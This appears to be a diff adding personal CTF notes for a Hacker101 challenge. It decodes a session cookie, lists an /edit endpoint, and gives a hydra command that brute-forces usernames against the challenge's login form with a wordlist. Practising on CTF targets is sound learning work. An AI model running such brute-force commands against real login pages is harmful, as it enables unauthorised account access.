@@ -1,0 +1,14 @@
+Cookie: session
+example:
+eyJjYXJ0IjpbMCwxLDAsMCwwLDAsMF0sIm1vZGlmaWVkIjp0cnVlfQ.Y0h_OA.EiEwueR6_nACTwLrKfs2W4Wn-Ww
+=> eyJjYXJ0IjpbMCwxLDAsMCwwLDAsMF0sIm1vZGlmaWVkIjp0cnVlfQ (base64
+=> .
+=> Y0h_OA
+=> .
+=> EiEwueR6_nACTwLrKfs2W4Wn-Ww
+
+hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -p asdf c357a979ac3eb7a30718cf19400d4b41.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -o scans/hydra_usernames -t 32 -vV
+
+Interessante Endpoints:
+- /edit => GET, POST allowed
+
